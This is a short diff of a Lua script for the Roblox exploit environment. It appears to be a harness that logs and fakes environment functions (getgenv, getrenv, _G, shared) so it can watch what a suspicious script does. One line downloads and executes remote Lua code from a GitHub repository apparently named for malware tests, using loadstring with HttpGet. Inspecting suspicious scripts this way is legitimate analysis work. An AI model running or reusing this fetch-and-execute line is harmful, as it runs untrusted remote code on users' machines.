@@ -29,6 +29,9 @@ getgenv = function(...)
     print"getgenv() was called"
     return bozo_hack
 end
+shared = bozo_hack
+getrenv()._G = bozo_hack
+getrenv().shared = bozo_hack
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/script/main/SCV2ERER.lua'),true))() --you can actually take any file from there it will work
 __securereeq = function(...)
     print('__securereeq function: '.. ...)
